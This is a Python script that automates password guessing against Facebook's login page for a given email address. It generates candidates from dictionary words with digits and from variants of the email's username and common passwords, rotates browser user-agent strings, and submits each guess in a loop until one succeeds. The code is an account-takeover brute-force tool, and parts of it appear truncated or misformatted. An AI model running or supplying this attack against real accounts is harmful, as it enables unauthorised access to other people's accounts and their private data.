import mechanize
import random
import string
import time
import nltk
from nltk.corpus import words

# Download the NLTK words corpus if not already downloaded
nltk.download('words')

class FacebookLogin:
    def __init__(self):                                                                                                                               self.useProxy = None
        self.br = mechanize.Browser()                                                                                                                 self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [('User-agent', random.choice([
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11                        >
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.4                        >
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54                         >
            'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.                        >
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
            'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]

class FacebookLoginImproved(FacebookLogin):
    def __init__(self):
        super().__init__()
        self.used_names = set()
        self.used_passwords = set()
        self.alternate_methods = ['random_words_numbers', 'username_variations']
        self.current_method = 0

    def login(self, email, password):
        try:
            self.br.open("https://www.facebook.com")
            self.br.select_form(nr=0)  # Assuming the login form is the first form on the page
            self.br.form['email'] = email
            self.br.form['pass'] = password
            response = self.br.submit()
            if 'home.php' in response.geturl() or 'logout.php' in response.geturl():
                print("Login successful! Email:", email, "Password:", password)
                return True
            else:
                print("Login failed for email:", email, "Password:", password)
                return False
        except Exception as e:
            print("An error occurred:", e)
            return False

def generate_password(fblogin, email):
    # Get the next method in the alternate methods list
    method = fblogin.alternate_methods[fblogin.current_method]
    fblogin.current_method = (fblogin.current_method + 1) % len(fblogin.alternate_methods)

    if method == 'random_words_numbers':
        # Generate a password with a random word followed by numbers
        password = generate_random_word() + ''.join(random.choices(string.digits, k=random.randint(1, 4)))
    else:
        # Generate a password with variations of the email address
        username = email.split('@')[0]  # Get the username part of the email
        variations = [
            username.lower(),
            username.upper(),
            username.capitalize(),
            username[::-1],  # Reverse username
            username + '123',  # Username + numbers
            username + '!@#',  # Username + symbols
            'password',  # Common word 'password'
            'qwerty',  # Common keyboard pattern 'qwerty'
            '123456'  # Common number sequence '123456'
        ]
        password = random.choice(variations)

    # Check if password has been used before, if not, return it
    if password not in fblogin.used_passwords:
        fblogin.used_passwords.add(password)
        return password
    else:
        # If password has been used, try again recursively
        return generate_password(fblogin, email)

def generate_random_word():
    # Generate a random word using NLTK words corpus
    word_list = [word for word in words.words() if len(word) >= 4]  # Filter words with length >= 4
    return random.choice(word_list)

def main():
    fblogin = FacebookLoginImproved()
    fb_user = input('Enter your Facebook email: ')
    max_attempts = int(input('Enter the maximum number of attempts: '))

    success = False
    attempt = 0
    while not success and attempt < max_attempts:
        password = generate_password(fblogin, fb_user)
        if fblogin.login(fb_user, password):
            success = True
        attempt += 1
        # Pause for a while before the next attempt
        time.sleep(1)

    if not success:
        print("Failed to find the correct password within the maximum number of attempts.")

if __name__ == '__main__':
    main()
